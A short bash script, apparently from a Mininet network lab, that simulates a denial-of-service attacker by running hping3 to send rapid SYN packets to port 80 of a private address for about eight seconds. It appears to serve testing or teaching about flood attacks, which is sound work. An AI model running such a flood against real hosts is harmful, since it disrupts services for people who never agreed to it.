#!/bin/bash
# flood.sh - simulate a flooding / DoS attacker
# Usage from Mininet CLI:  room204_h5 bash network/flood.sh 10.0.2.6
TARGET=${1:-10.0.2.6}
echo "[flood] flooding $TARGET for ~8s"
timeout 8 hping3 -i u3000 -S -p 80 "$TARGET"
echo "[flood] done"